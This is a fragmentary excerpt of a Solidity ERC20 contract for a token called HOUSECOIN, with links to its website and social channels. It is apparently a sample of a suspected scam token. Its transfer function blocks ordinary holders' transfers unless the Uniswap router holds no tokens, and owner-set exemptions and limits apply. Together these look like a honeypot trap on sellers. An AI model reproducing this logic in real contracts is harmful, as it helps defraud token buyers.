...
https://www.webuyhousecoins.com/
https://x.com/search?q=%24HOUSE&src=typed_query
https://t.me/HousecoinPortal/7
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1HOUSECOIN");
        require(recipient != address(0), "2HOUSECOIN");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3HOUSECOIN");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4HOUSECOIN");
        require(spender != address(0), "5HOUSECOIN");
...
contract HOUSECOIN is ERC20 {
    ...
    constructor(address router) ERC20("HOUSECOIN", "HOUSE", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6HOUSECOIN");
        require(to != address(0), "7HOUSECOIN");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8HOUSECOIN");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9HOUSECOIN");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0HOUSECOIN");
            }
        }
    }
}